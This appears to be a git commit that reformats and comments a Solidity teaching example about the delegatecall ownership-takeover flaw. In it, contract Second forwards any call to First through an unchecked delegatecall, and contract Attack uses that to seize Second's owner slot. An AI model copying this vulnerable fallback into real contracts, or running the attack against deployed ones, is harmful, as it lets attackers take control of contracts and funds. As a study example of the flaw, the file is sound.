4f690f1aa4667cb1f35bba1fbb9461f62016e7c3
Yaghoub Adelzadeh <adelzadeh74@gmail.com>
2024-06-11 11:51:01 +0330

    Update Example1.sol

--- DelegateCall/Example1.sol
+++ DelegateCall/Example1.sol
@@ -4,35 +4,46 @@
 
 pragma solidity ^0.8.20;
 
+// Contract First
+// Simple contract to set an owner address.
 contract First {
     address public owner;
 
-    function setOwner () public {
+    // Function to set the owner address to the caller's address.
+    function setOwner() public {
         owner = msg.sender;
     }
 }
 
+// Contract Second
+// Contract that interacts with contract First using delegatecall.
 contract Second {
     address public owner;
     First public first;
 
-    constructor (First _first) {
-        first = First (_first);
+    // Constructor to set the address of contract First.
+    constructor(First _first) {
+        first = First(_first);
     }
 
-    fallback () external payable {
-        address (first).delegatecall(msg.data);
+    // Fallback function to delegate calls to contract First.
+    fallback() external payable {
+        address(first).delegatecall(msg.data);
     }
 }
-// Attacker can be owner of Second contract with calling attack function!
+
+// Contract Attack
+// Contract to demonstrate an attack by calling setOwner on contract Second.
 contract Attack {
     address public second;
-    
-    constructor (address _second) {
+
+    // Constructor to set the address of contract Second.
+    constructor(address _second) {
         second = _second;
     }
 
-    function attack () public {
+    // Function to perform the attack by calling setOwner on contract Second.
+    function attack() public {
         second.call(abi.encodeWithSignature("setOwner()"));
     }
 }
